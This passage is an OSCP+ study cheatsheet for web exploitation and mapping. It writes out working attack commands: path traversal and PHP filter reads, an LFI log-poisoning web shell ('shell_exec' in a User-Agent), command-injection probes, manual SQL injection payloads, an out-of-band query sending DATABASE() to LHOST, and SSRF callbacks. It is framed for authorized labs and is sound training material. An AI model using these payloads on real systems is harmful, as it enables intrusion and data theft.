title: 10.13.1 Exam-rule flags
text: id="exam-rule-flags">10.13.1 Exam-rule flags SQLmap and similar automatic exploitation tools: prohibited by the current OSCP+ guide; use manual SQLi procedures. Responder poisoning/spoofing: spoofing is prohibited by the current guide; lab concept only unless rules explicitly change. Metasploit/Meterpreter: restricted to one selected target; msfvenom and multi/handler have specific exceptions in the current guide. Metasploit pivoting: explicitly prohibited by the current guide. Nmap/NSE, Nikto and Burp Free are explicitly listed as permitted in the current guide, but tool features performing prohibited functions remain prohibited. Always recheck the current official guide before a mock or exam.

title: 10.14 Tools and scripts by task
text: id="tools-and-scripts-by-task">10.14 Tools and scripts by task Cheatsheet index | Operational index Choose a task, then use its complete commands and conditions. Tool links open the upstream source/documentation; they do not install anything. <h2

title: 10.14.1 Quick lookup
text: id="quick-lookup">10.14.1 Quick lookup Tool / script Choose it for Procedure Nmap Full TCP coverage; identify applications on the ports found. Discover TCP ports with SYN or connect scans Nmap UDP Keep UDP results and ambiguous silence separate from TCP. Probe UDP and resolve ambiguous silence smbclient List shares, then read files in the accepted identity. Enumerate SMB/RPC shares, files and identities SMBMap Map share rights and retrieve one useful file. Enumerate SMB/RPC shares, files and identities enum4linux-ng Collect SMB/RPC candidates with anonymous or known credentials. Enumerate SMB/RPC shares, files and identities snmpwalk Query an observed community/version for configuration leads. Extract configuration and process information through SNMP dig Resolve names and test authorized zone-transfer conditions. Expand names through DNS records and zone transfers impacket-mssqlclient Inspect SQL Server login, grants and enabled operations. Use SQL Server rights, impersonation and command facilities curl Replay the real host, method, cookie and input. Establish scheme, host, redirects and request state Gobuster Discover paths after measuring a missing-path response. Discover directories and files with controlled response filtering ffuf Fuzz one boundary in a valid request; preserve its session. Map parameters, API methods, objects and writable properties Burp Suite Capture and compare normal requests before modifying inputs. Map functions, roles and normal requests manually WPScan Use only after confirming WordPress and relevant components. Use WordPress component evidence and authorized administration features curl request tests Prove the command/parser effect before choosing a session. Prove visible or blind operating-system command injection Hashcat Select the identified artifact format and feasible candidate strategy. Recover passwords with feasible dictionary, rule and mask attacks John the Ripper Extract a supported verifier, recover offline, then validate access. Recover passwords with feasible dictionary, rule and mask attacks RunasCs Use known plaintext credentials from an existing Windows shell. Validate known passwords and context-specific reuse SearchSploit Find and inspect a PoC matching the exact feature/configuration. Match a public exploit to the actual component and configuration Python venv Separate local runtime/dependency errors from target rejection. Audit a PoC and reproduce its interpreter/dependency environment GCC Match process architecture, ABI and required libraries. Compile and minimally adapt an existing native or memory-corruption PoC SCP Move files when authenticated SSH is the reachable channel. Copy files through an authenticated SSH service Python HTTP server Transfer a reviewed artifact over a reachable HTTP leg. Transfer over HTTP using Linux or Windows clients PTY / stty Stabilize an existing command session; retain the original channel. Repair a limited Linux terminal LinPEAS Early Linux candidate collection, followed by exact-object checks. Use enumeration tools to generate manually testable candidates pspy Observe transient privileged consumers and their real commands. Control a script, binary or configuration consumed by a privileged job/service GTFOBins Match the exact binary, rule and privilege-preserving mode. Use an allowed sudo operation to cross a privilege boundary getcap / capabilities Connect an effective file capability to an available operation. Use a file capability that enables a specific privileged operation winPEAS Early Windows candidate collection; inspect out.txt. Turn automated Windows findings into manually verified candidates Seatbelt Choose a focused system or current-user survey. Turn automated Windows findings into manually verified candidates PrivescCheck Check permissions in the current token , with readable reports. Turn automated Windows findings into manually verified candidates LaZagne Recover supported application stores in the accessible user context. Recover Windows application, history and stored-credential artifacts SharpHound / BloodHound CE Collect compatible graph data and validate the useful edge. Collect focused BloodHound data and validate an attack path NetExec Validate domain identity and service-specific authorization . Establish domain identity, DC, DNS, time and route PowerView Inspect directory objects/rights from the current Windows context. Enumerate directory objects with native, LDAP and PowerView approaches Impacket Kerberos tools Use the matching identity, SPN and ticket-request prerequisites. Request a selected service ticket for offline service-account recovery Rubeus Inventory ticket contexts before using a selected ticket. Inventory, convert and import tickets in the correct logon context Certipy Inspect AD CS prerequisites before a certificate-based transition. Conditional: validate an AD CS enrollment-to-authentication path Evil-WinRM Use when the accepted identity has WinRM authorization. Use WinRM, WinRS or PowerShell remoting Impacket WMI Use a permitted WMI/RPC path with the matching authentication material. Execute through WMI or native CIM over DCOM FreeRDP Check remote interactive rights and preserve the current session. Obtain an authorized RDP interactive session SSH forwards Choose the listening side and destination leg explicitly. Forward a selected service through an SSH client-side listener Chisel Use a reverse transport when the pivot can reach your listener. Use a reverse Chisel SOCKS or fixed TCP tunnel Ligolo-ng Route only the intended internal prefixes through the working agent. Route a selected internal subnet through Ligolo-ng ProxyChains-NG Use compatible TCP clients through a verified SOCKS listener. Use ProxyChains, native SOCKS clients and SSH jump paths appropriately Metasploit handler Match payload transport, architecture and listener; inspect framework limits. Pair staged payloads with the correct handler and session lifecycle PowerShell Distinguish parsing, pol

title: 10.14.2 Further reference
text: id="further-reference">10.14.2 Further reference The command-first organization and gap review were informed by 0xsyr0/OSCP . Commands and interpretations here are maintained against the linked upstream documentation and our owning procedures. Full exploit files remain at their upstream locations; no third-party repository is mirrored here.

title: 10.15 Web Exploitation Cheatsheet
text: id="web-exploitation-cheatsheet">10.15 Web Exploitation Cheatsheet ← Cheatsheet index · Map the application first · Stage 03 procedures · Mechanics | Strategy map | Study methods: Turn application weaknesses into access Rule: preserve a valid request, change one thing, compare a control, and name only the primitive proved. Use only on assigned, authorized targets. <h2

title: 10.15.1 Primitive ladder
text: id="primitive-ladder">10.15.1 Primitive ladder controlled input -> changed server behavior -> read/write/execute/auth/authz primitive -> useful artifact/effect -> independently verified access -> re-enumerate Result What it proves Next question Recognizable file content File read Does it disclose source, config, users, keys or credentials? Retrievable uploaded marker File write/storage Where is it stored, renamed, served and handled? Target command output OS execution Which identity/environment, and how is a reliable session obtained? Query true/false difference Query influence Which DBMS and extraction mechanism? Another user's data/action Authorization failure Which objects, methods and roles are affected? JavaScript in target origin Browser execution Which relevant victim and privileged action exist? <h2

title: 10.15.2 File paths and uploads
text: id="file-paths-and-uploads">10.15.2 File paths and uploads Traversal/file read: curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH PHP source disclosure: curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php printf '%s' 'BASE64_DATA' | base64 -d LFI/log execution chain: curl -sk -A '<?php echo shell_exec($_GET["cmd"]); ?>' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php Benign upload first: printf '%s\n' 'UPLOAD_CANARY_7F31' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;filename=probe.txt;type=text/plain' http://TARGET:PORT/upload Verify acceptance, server-side name, retrieval URL, exact bytes and response type. Only then test handler-specific execution. Full variants: web file handling . <h2

title: 10.15.3 Command injection
text: id="command-injection">10.15.3 Command injection Visible output: curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH Blind timing: curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH Repeat controls; reflection is not execution and one slow request is not proof. After execution, verify id / whoami , hostname and working directory, then use Block 7. Full procedure: command and SQL injection . <h2

title: 10.15.4 Manual SQL injection
text: id="manual-sql-injection">10.15.4 Manual SQL injection Detect with controlled pairs: VALUE' # parser/error clue VALUE' AND '1'='1 # true VALUE' AND '1'='2 # false UNION shape and displayed column: ' ORDER BY 1-- - ' ORDER BY 2-- - ' UNION SELECT NULL,NULL,NULL-- - ' UNION SELECT NULL,'MARKER_7F31',NULL-- - Fingerprint only after injection proof: MySQL/PostgreSQL: ' UNION SELECT NULL,version(),NULL-- - MSSQL: ' UNION SELECT NULL,@@version,NULL-- - Boolean/time examples: ' AND SUBSTRING((SELECT version()),1,1)='P'-- - MySQL: ' AND IF(1=1,SLEEP(5),0)-- - PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'-- Out-of-band proof candidate after in-band/blind methods fail: SELECT LOAD_FILE(CONCAT('\\\\LHOST\\', DATABASE())); Use only a controlled uniquely labelled listener/domain and no sensitive data. A callback proves a server-side request, not full extraction. Database-to-OS execution/OOB requires separate DBMS, privilege, path/feature and egress conditions. SQLmap is prohibited by the current OSCP+ exam guide. <h2

title: 10.15.5 Access control and XSS
text: id="access-control-and-xss">10.15.5 Access control and XSS IDOR comparison: GET /api/objects/OBJECT_B HTTP/1.1 Host: DOMAIN Authorization: Bearer USER_A_TOKEN Keep A's session and change only A's object reference to B's. Compare owned, unowned and nonexistent objects; verify read/write/delete effects separately. Mass assignment candidate: curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD","role":"administrator"}' http://TARGET:PORT/api/v1/register Verify through a separate login and administrator-only action. XSS context proof: Confirm reflection/storage/DOM sink, target origin and relevant viewer. Browser execution is not a server shell; its value comes from a victim's same-origin actions. Full procedure: access control and XSS .

title: 10.15.6 WordPress
text: id="wordpress">10.15.6 WordPress curl -sk https://HOSTNAME/wp-json/ | head curl -sk https://HOSTNAME/wp-login.php -o wp-login.html wpscan --url https://HOSTNAME/ --disable-tls-checks --enumerate vp,vt,u --plugins-detection mixed -o wpscan.txt Verify active core/plugin/theme version and vulnerable configuration manually. After login, map the actual role/capabilities; upload, editor, plugin-install and user-management rights are distinct. <h2

title: 10.15.7 SSRF
text: id="ssrf">10.15.7 SSRF <h3

title: 10.15.7.1 Kali listener
text: id="variant-10-15-7-1">10.15.7.1 Kali listener # Kali listener python3 -m http.server LPORT --bind 0.0.0.0 <h3

title: 10.15.7.2 hypothetical replay
text: id="variant-10-15-7-2">10.15.7.2 hypothetical replay # hypothetical replay curl -sk 'https://HOSTNAME/fetch?url=http://LHOST:LPORT/ssrf-marker' After a controlled callback proves server-side fetching: curl -sk 'https://HOSTNAME/fetch?url=http://127.0.0.1:PORT/' curl -sk -X POST https://HOSTNAME/fetch --data-urlencode 'url=http://127.0.0.1:PORT/' Compare known-open/known-closed destinations. Browser fetch/reflection/redirect is not SSRF; internal content read is not execution. <h2

title: 10.15.8 Fast failure routing
text: id="fast-failure-routing">10.15.8 Fast failure routing Symptom Decision 200 with normal template No primitive yet; inspect stable content, normalization and exact parameter Upload returns success but no file Find final name/path or record as inconclusive Uploaded code downloads/displays Write/retrieval only; no executable handler Quote causes generic 500 Compare true/false; distinguish DB/app/WAF error UNION errors Recheck context, column count, types and comments Timing is noisy Repeat control/test and lengthen only within safe lab bounds Object change gives same user's data Authorization held in that context XSS runs only for tester Self/reflected path lacks a useful viewer/delivery chain <h2

title: 10.15.9 Handoffs
text: id="handoffs">10.15.9 Handoffs credential/key/token -> Block 5 product/version/CVE -> Block 6 verified command execution -> Block 7 useful application role -> authenticated Block 3 remap server-side internal reachability -> enumerate only proved destination/route new host/address/listener/route -> Block 1 <h2

title: 10.15.10 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.15.10 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.15.10.1 Turn application weaknesses into access
text: id="turn-application-weaknesses-into-access">10.15.10.1 Turn application weaknesses into access <summary

title: 10.15.10.1.1 Find: Read files through directory traversal
text: id="variant-10-15-10-1-1">10.15.10.1.1 Find: Read files through directory traversal Find real download/preview/export requests in the behavior map; inspect which filename/path values the normal request accepts. curl -sk -b cookies.txt -D - 'http://TARGET:PORT/download?file=report.pdf' Recognize: An application-controlled file selection is the cue to test path confinement; it is not yet arbitrary read. Validate next: Request a known target-platform file through the real file parameter/path and compare with the normal response. Require recognizable file contents; a reflected filename, error or status change is not a read. Read files through directory traversal . <summary

title: 10.15.10.1.2 Find: Disclose PHP source through an inclusion wrapper
text: id="variant-10-15-10-1-2">10.15.10.1.2 Find: Disclose PHP source through an inclusion wrapper Inspect the normal page selector, PHP technology evidence and any readable source/configuration clue obtained during mapping. curl -sk -D - 'http://TARGET:PORT/index.php?page=about' Recognize: An include-related error suggests an evaluating PHP sink, unlike an ordinary file-download function. Validate next: Verify that the actual sink accepts a filter wrapper and returns decodable target source; errors alone do not prove it. Disclose PHP source through an inclusion wrapper . <summary

title: 10.15.10.1.3 Find: Turn controlled local file content into inclusion execution
text: id="variant-10-15-10-1-3">10.15.10.1.3 Find: Turn controlled local file content into inclusion execution After a file/include primitive is demonstrated, use readable configuration to locate the actual log and check whether your harmless request marker is present. curl -sk -A 'LOG_CANARY' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/PATH/TO/access.log' http://TARGET:PORT/index.php Recognize: The include/read identity can reach a log containing your controlled input; evaluation and payload preservation still need proof. Validate next: Separate raw file read from interpreter evaluation, confirm exact file path and encoding, then a minimal command effect. Turn controlled local file content into inclusion execution . <summary

title: 10.15.10.1.4 Find: Establish upload acceptance, storage and retrieval
text: id="variant-10-15-10-1-4">10.15.10.1.4 Find: Establish upload acceptance, storage and retrieval Browse normal attachment/import/profile functions and capture one accepted harmless multipart upload with its returned identifier. printf '%s\n' 'UPLOAD_CANARY' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;type=text/plain' http://TARGET:PORT/upload Recognize: The real upload route, field and response identify a storage/retrieval candidate. Validate next: Retrieve the canary independently; establish stored bytes, final name and account/context before testing execution. Establish upload acceptance, storage and retrieval . <summary

title: 10.15.10.1.5 Find: Execute an uploaded file through a compatible handler
text: id="variant-10-15-10-1-5">10.15.10.1.5 Find: Execute an uploaded file through a compatible handler Begin with a verified retrievable upload; inspect final naming, response handling and evidence of the application's actual interpreter. curl -sk -i http://TARGET:PORT/uploads/FILE Recognize: A retrievable script may be inert. The interesting detail is how the final location is handled, not acceptance of a script extension. Validate next: Retrieve the exact stored upload and request it through the candidate server-side handler. Verify an attributable identity marker from that request; uploaded bytes or a 200 response alone do not prove execution. Execute an uploaded file through a compatible handler . <summary

title: 10.15.10.1.6 Find: Use upload path control to reach a useful consumer
text: id="variant-10-15-10-1-6">10.15.10.1.6 Find: Use upload path control to reach a useful consumer Inspect an accepted upload's raw multipart filename/path fields and compare the returned destination for one harmless unique filename. curl -sk -b cookies.txt -F 'file=@probe.txt;filename=../UNIQUE_CANARY.txt;type=text/plain' http://TARGET:PORT/upload Recognize: An independently located out-of-directory canary is path-control evidence; it does not establish access to another user's key directory. Validate next: Confirm filesystem identity, exact destination semantics, write permissions and a useful consumer/trigger. Use upload path control to reach a useful consumer . <summary

title: 10.15.10.1.7 Find: Prove visible or blind operating-system command injection
text: id="variant-10-15-10-1-7">10.15.10.1.7 Find: Prove visible or blind operating-system command injection Find a mapped feature that runs a system-like operation, inspect its request, and compare a normal value with one bounded command-dependent probe. curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH Recognize: The function and output suggest an OS utility consumer; the parameter's parsing boundary is the candidate. Validate next: Replay the real request with a benign id/whoami marker and a normal control. Require attributable command output, or repeat bounded timing/control tests for a blind sink. Reflected text or one slow response is not execution. Prove visible or blind operating-system command injection . <summary

title: 10.15.10.1.8 Find: Establish SQL query influence and DBMS context
text: id="variant-10-15-10-1-8">10.15.10.1.8 Find: Establish SQL query influence and DBMS context Map a data lookup/login/search request, preserve its session and compare one changed input with normal/invalid controls. curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH curl -skG --data-urlencode "PARAM=NORMAL_VALUE'" http://TARGET:PORT/PATH Recognize: A database-looking error ties the input to a possible query parser; it is a hypothesis until controlled predicates affect query behavior. Validate next: Identify quote/query context and repeat true/false comparisons; establish the DBMS before DB-specific payloads. Establish SQL query influence and DBMS context . <summary

title: 10.15.10.1.9 Find: Test a SQL-backed authentication bypass
text: id="variant-10-15-10-1-9">10.15.10.1.9 Find: Test a SQL-backed authentication bypass Use the actual login request already shown to influence SQL, including its real username/password fields and invalid-login control. curl -sk -i --data-urlencode 'username=USER' --data-urlencode 'password=INVALID_CONTROL' http://TARGET:PORT/login Recognize: The authentication decision may depend on the injectable query result, creating a bypass candidate. Validate next: Verify query shape and post-query checks, then independently confirm the resulting session identity/protected action. Test a SQL-backed authentication bypass . <summary

title: 10.15.10.1.10 Find: Extract data through UNION and visible SQL results
text: id="variant-10-15-10-1-10">10.15.10.1.10 Find: Extract data through UNION and visible SQL results After controlled SELECT influence, inspect which database result fields are rendered and test the documented column-shape controls. curl -skG --data-urlencode "PARAM=VALUE' ORDER BY 1-- -" http://TARGET:PORT/PATH Recognize: A predictable shape boundary in a rendered SELECT suggests a UNION channel, subject to column types and reflection. Validate next: Confirm column count/types and a query-generated visible marker before extracting selected metadata. Extract data through UNION and visible SQL results . <summary

title: 10.15.10.1.11 Find: Infer SQL data through boolean or time-based differences
text: id="variant-10-15-10-1-11">10.15.10.1.11 Find: Infer SQL data through boolean or time-based differences Start from proven query influence and compare stable true/false controls or repeated baseline timings when no rows are rendered. curl -sk -o /dev/null -w '%{time_total}\n' --get --data-urlencode 'PARAM=BASELINE_VALUE' http://TARGET:PORT/PATH Recognize: A repeatable predicate-dependent difference provides an inference channel even without visible rows. Validate next: Validate controls using a known predicate and separate caching, network load and backend delay. Infer SQL data through boolean or time-based differences . <summary

title: 10.15.10.1.12 Find: Convert database rights into a file or operating-system effect
text: id="variant-10-15-10-1-12">10.15.10.1.12 Find: Convert database rights into a file or operating-system effect From the authenticated/injected database context inspect the real role, grants, enabled facilities and server identity before selecting any file/command transition. SELECT SYSTEM_USER, ORIGINAL_LOGIN(); SELECT IS_SRVROLEMEMBER('sysadmin'); Recognize: Database administration is a useful enabling clue, but it is not an observed OS shell or a domain privilege level. Validate next: Match the DBMS-specific facility, configuration, OS permission and consumer; verify a minimal actual OS effect. Convert database rights into a file or operating-system effect . <summary

title: 10.15.10.1.13 Find: Cross an object-ownership boundary
text: id="variant-10-15-10-1-13">10.15.10.1.13 Find: Cross an object-ownership boundary Capture object requests for two authorized study accounts and associate each object ID with its owner before making a cross-account comparison. curl -sk -b lower-role.cookies http://TARGET:PORT/api/objects/OBJECT_ID Recognize: A private object owned by another controlled account is returned to the lower-context requester. Validate next: Confirm intended sharing rules, account isolation and actual object content/change with valid controls. Cross an object-ownership boundary . <summary

title: 10.15.10.1.14 Find: Cross role, function or session authorization boundaries
text: id="variant-10-15-10-1-14">10.15.10.1.14 Find: Cross role, function or session authorization boundaries Compare ordinary-user and authorized-administrator requests for a real protected function, preserving method, CSRF/session and arguments. curl -sk -i -b lower-role.cookies http://TARGET:PORT/ADMIN_PATH Recognize: A visible administrative route is a lead; only a server-side protected effect establishes the missing role check. Validate next: Replay a valid authorized action under the lower context and independently inspect its permitted effect. Cross role, function or session authorization boundaries . <summary

title: 10.15.10.1.15 Find: Modify a protected property through excessive writable fields
text: id="variant-10-15-10-1-15">10.15.10.1.15 Find: Modify a protected property through excessive writable fields Read a legitimate API profile and inspect its schema/update request for security-sensitive properties not exposed by the user interface. curl -sk -b cookies.txt http://TARGET:PORT/api/PROFILE_PATH Recognize: Returned owner/role fields identify properties to investigate; they are not evidence that the server binds them on update. Validate next: Check accepted writable fields, independent persistence and a resulting permission change. Modify a protected property through excessive writable fields . <summary

title: 10.15.10.1.16 Find: Execute browser code and validate a useful same-origin action
text: id="variant-10-15-10-1-16">10.15.10.1.16 Find: Execute browser code and validate a useful same-origin action Locate a normal reflected/stored input and inspect its final HTML/DOM context in the browser rather than treating raw reflection as execution. curl -skG --data-urlencode 'PARAM=UNIQUE_MARKER' http://TARGET:PORT/PATH Recognize: The output context and escaping determine whether browser execution is plausible; the second form is escaped text. Validate next: Verify the actual browser sink/execution, victim origin/role, required interaction and useful authorized same-origin action. Execute browser code and validate a useful same-origin action . <summary

title: 10.15.10.1.17 Find: Use WordPress component evidence and authorized administration features
text: id="variant-10-15-10-1-17">10.15.10.1.17 Find: Use WordPress component evidence and authorized administration features Confirm WordPress-specific routes/components and inspect the capabilities actually presented after an accepted application login. curl -sk -i http://TARGET:PORT/wp-login.php Recognize: Product/component and role clues guide two different paths: exact component exploit matching or a permitted administrative feature. Validate next: Verify build/configuration for a CVE, or actual editor/plugin/file rights plus executable handling for a feature chain. Use WordPress component evidence and authorized administration features . <summary

title: 10.15.10.1.18 Find: Use server-side requests to inspect reachable internal behavior
text: id="variant-10-15-10-1-18">10.15.10.1.18 Find: Use server-side requests to inspect reachable internal behavior Browse legitimate import/preview/webhook functions and identify a request whose normal input is a server-fetched URL. curl -skG --data-urlencode 'url=http://LHOST:PORT/FETCH_CANARY' http://TARGET:PORT/FETCH_PATH Recognize: A correlated receiver event supports server-side fetching; it does not establish internal access or response-readable SSRF. Validate next: Separate client-side fetches, server source, destination/protocol restrictions and response visibility. Use server-side requests to inspect reachable internal behavior . <summary

title: 10.15.10.1.19 Find: Conditional: validate an out-of-band SQL request channel
text: id="variant-10-15-10-1-19">10.15.10.1.19 Find: Conditional: validate an out-of-band SQL request channel After DBMS/query influence is established, document the absence of stable in-band channels and inspect whether the database platform exposes a permitted outbound lookup facility. curl -sk -D - --get --data-urlencode 'PARAM=BASELINE_VALUE' http://TARGET:PORT/PATH Recognize: Lack of an in-band channel motivates investigation but does not prove an outbound channel exists. Validate next: Confirm the exact function, database/OS rights, allowed egress and a uniquely correlated controlled receiver event. Conditional: validate an out-of-band SQL request channel .

title: 10.16 Web Mapping Cheatsheet
text: id="web-mapping-cheatsheet">10.16 Web Mapping Cheatsheet ← Cheatsheet index · Complete HTTP procedure · Next: web exploitation · Mechanics | Strategy map | Study methods: Map useful web behavior Use when: an HTTP(S) endpoint must become an evidence-labelled application map. Replace placeholders and keep each identity's cookies/tokens separate. <h2

title: 10.16.1 First five minutes
text: id="first-five-minutes">10.16.1 First five minutes curl -skL -D headers.txt -o body.html http://TARGET:PORT/ curl -sk -o /dev/null -w 'code=%{http_code} bytes=%{size_download} type=%{content_type} redirect=%{redirect_url}\n' http://TARGET:PORT/ curl -sk http://TARGET:PORT/robots.txt curl -sk http://TARGET:PORT/sitemap.xml Record: scheme://host:port | redirect/title/certificate | anonymous/authenticated role METHOD PATH | INPUT | OBJECT/FUNCTION | STATUS/LENGTH/MARKER | NEXT TEST <h2

title: 10.16.2 Burp manual loop
text: id="burp-manual-loop">10.16.2 Burp manual loop Scope target -> browse normally with Intercept off -> Proxy history -> send interesting request to Repeater -> unchanged baseline -> change one field/header/cookie/method/object -> compare -> save decisive pair Replay curl through Burp: curl -sk -x http://127.0.0.1:8080 -c cookies.txt -b cookies.txt http://TARGET:PORT/PATH <h2

title: 10.16.3 Useful artifacts
text: id="useful-artifacts">10.16.3 Useful artifacts curl -sk http://TARGET:PORT/.git/HEAD curl -sk http://TARGET:PORT/openapi.json curl -sk http://TARGET:PORT/swagger.json Inspect HTML comments, hidden inputs, forms, JavaScript route strings, fetch /XHR calls, source maps, cookies and response headers. <h2

title: 10.16.4 Content discovery
text: id="content-discovery">10.16.4 Content discovery Calibrate with a random nonexistent path, then: gobuster dir -u http://TARGET:PORT/ -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-root.txt gobuster dir -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -t 10 -o gobuster-ext.txt Authenticated: gobuster dir -u http://TARGET:PORT/ -w WORDLIST -c 'SESSION=VALUE' -H 'Authorization: Bearer TOKEN' -t 10 -o gobuster-auth.txt Confirmed soft-404 length: gobuster dir -u http://TARGET:PORT/ -w WORDLIST --exclude-length NOISE_LENGTH -t 10 -o gobuster-filtered.txt Check 200 , redirects, 401 , 403 and 405 . A tool result is a candidate until manually reproduced. Alternative engines, same decision: feroxbuster -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -o ferox.txt ffuf -w WORDLIST -u http://TARGET:PORT/FUZZ -ac -of json -o ffuf-content.json wfuzz -c -z file,WORDLIST --hc 404 http://TARGET:PORT/FUZZ -ac /status filters are starting points, not proof. Calibrate against random paths and compare stable body markers, lengths and redirects. <h2

title: 10.16.5 Virtual hosts
text: id="virtual-hosts">10.16.5 Virtual hosts gobuster vhost -u http://DOMAIN:PORT/ --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vhosts.txt ffuf -w WORDLIST -u http://TARGET:PORT/ -H 'Host: FUZZ.DOMAIN' -ac -o ffuf-vhosts.json curl -sk -H 'Host: CANDIDATE.DOMAIN' http://TARGET:PORT/ Compare candidate and random Host responses before accepting a vhost. <h2

title: 10.16.6 Parameters and object values
text: id="parameters-and-object-values">10.16.6 Parameters and object values ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://TARGET:PORT/PATH?FUZZ=test' -ac -o params-get.json ffuf -w WORDLIST -u http://TARGET:PORT/PATH -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'known=value&FUZZ=test' -ac -o params-post.json ffuf -w NUMBERS -u 'http://TARGET:PORT/api/objects/FUZZ' -H 'Authorization: Bearer TOKEN' -mc all -fc 404 -o object-values.json <h2

title: 10.16.7 APIs
text: id="apis">10.16.7 APIs curl -ski http://TARGET:PORT/api/v1/PATH curl -ski -X OPTIONS http://TARGET:PORT/api/v1/PATH curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD"}' http://TARGET:PORT/api/v1/login PATH | METHOD | IDENTITY/ROLE | OBJECT/PROPERTY | RESULT | NEXT 405 often means valid route/wrong method. Validation errors disclose schema candidates. Verify every token through a separate authorized request. <h2

title: 10.16.8 Attack-input routing
text: id="attack-input-routing">10.16.8 Attack-input routing Observed input/behavior Open filename/path/template/download/upload File handling diagnostic/archive/ping/URL or database-backed field Command and SQL injection object ID, role/property, admin API or rendered user input Access control and XSS server-side URL fetch, webhook, preview or import WordPress and SSRF WordPress assets, REST routes or login WordPress and SSRF exact product/plugin/version candidate Block 6 public exploits credential/token/key Block 5, then remap authenticated behavior verified OS command Block 7 session handling <h2

title: 10.16.9 Common failure decisions
text: id="common-failure-decisions">10.16.9 Common failure decisions Symptom Next action All paths return 200 Measure a random path; filter only confirmed noise Browser works, curl fails Copy exact Host/cookie/token/CSRF/method/content type from Burp Repeated login redirects Refresh auth context; use a separate cookie jar 403 Compare random path; retry only with legitimate new identity 405 Inspect Allow , docs and JavaScript; test supported method Candidate disappears after filtering Remove filter and manually compare body markers <h2

title: 10.16.10 ffuf with the captured request
text: id="ffuf-with-the-captured-request">10.16.10 ffuf with the captured request Save a manually verified raw request as request.txt and place FUZZ at one input. Preserve the correct Host, cookie and body. Choose the actual transport: ffuf -request request.txt -request-proto https -w WORDLIST -mc all -ac -t 10 -o request-https.json ffuf -request request.txt -request-proto http -w WORDLIST -mc all -ac -t 10 -o request-http.json Replay outliers. Uniform login redirects → refresh the session; changing CSRF tokens → fix token handling before further fuzzing. Full mapping procedure . <h2

title: 10.16.11 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.16.11 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.16.11.1 Map useful web behavior
text: id="map-useful-web-behavior">10.16.11.1 Map useful web behavior <summary

title: 10.16.11.1.1 Find: Establish scheme, host, redirects and request state
text: id="variant-10-16-11-1-1">10.16.11.1.1 Find: Establish scheme, host, redirects and request state Request the assigned HTTP endpoint without following redirects blindly; inspect location, cookies and alternate scheme/hostname behavior. curl -skD headers.txt -o body.html http://TARGET:PORT/ curl -skI https://TARGET:PORT/ Recognize: The hostname/scheme redirect identifies the application request context to reproduce. Validate next: Confirm the hostname routes to the assigned address and preserve its TLS/Host/session state. Establish scheme, host, redirects and request state . <summary

title: 10.16.11.1.2 Find: Map functions, roles and normal requests manually
text: id="variant-10-16-11-1-2">10.16.11.1.2 Find: Map functions, roles and normal requests manually Browse the site's normal account, export, upload and download features while recording requests in the browser/proxy. curl -sk -b cookies.txt -D response-headers.txt http://TARGET:PORT/PATH Recognize: The normal request exposes a file-selecting input discovered through functionality, not guessed from a payload list. Validate next: Find the actual input semantics, account/role and normal response before file/read/ authorization tests. Map functions, roles and normal requests manually . <summary

title: 10.16.11.1.3 Find: Inspect source, backups, configuration and repository artifacts
text: id="variant-10-16-11-1-3">10.16.11.1.3 Find: Inspect source, backups, configuration and repository artifacts Inspect linked JavaScript/source, robots/sitemaps, relevant backups and a bounded Git metadata check from the mapped web application. curl -sk http://TARGET:PORT/robots.txt curl -sk http://TARGET:PORT/.git/HEAD Recognize: The path and Git reference are investigation leads; neither proves a working secret or complete repository. Validate next: Compare missing-path controls, retrieve actual permitted artifacts and verify recovered history/account context. Inspect source, backups, configuration and repository artifacts . <summary

title: 10.16.11.1.4 Find: Discover directories and files with controlled response filtering
text: id="variant-10-16-11-1-4">10.16.11.1.4 Find: Discover directories and files with controlled response filtering Establish the application's missing-path response, then run a bounded content search with the existing session/host context. curl -sk -D - http://TARGET:PORT/KNOWN_MISSING_PATH Recognize: The candidate's actual function differs from the soft-404 control despite equal status codes. Validate next: Request a known-missing path under the same host/session and compare status, body and length. Open each distinct Gobuster/ffuf result; a uniform login page or soft-404 is a filter problem, not a directory finding. Discover directories and files with controlled response filtering . <summary

title: 10.16.11.1.5 Find: Discover virtual hosts and hostname-selected applications
